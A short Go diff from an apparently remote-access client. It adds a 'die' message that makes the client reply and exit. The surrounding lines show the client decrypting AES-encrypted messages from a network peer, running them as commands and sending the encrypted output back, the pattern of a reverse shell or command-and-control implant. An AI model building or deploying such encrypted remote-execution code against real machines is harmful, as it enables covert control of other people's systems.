@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"net"
+	"os"
 
 	"github.com/bogdzn/razin/server/aes"
 	"github.com/spf13/cobra"
@@ -66,6 +67,12 @@ func LoadClientCLI() *cobra.Command {
 				if opts.DebugEnabled {
 					fmt.Printf(" ---=== [ new packet ] ===---\nReceived: %s\nTranslated: %s\n\n", msg, decrypted)
 				}
+
+                if decrypted == "die" {
+                    fmt.Fprint(conn, aes.EncryptAes("good-bye...", opts.AesKey) + "\n")
+                    os.Exit(0)
+                    return
+                }
 
 				out, _ := ExecuteCommand(decrypted, opts)
 				fmt.Fprint(conn, aes.EncryptAes(out, opts.AesKey)+"\n")
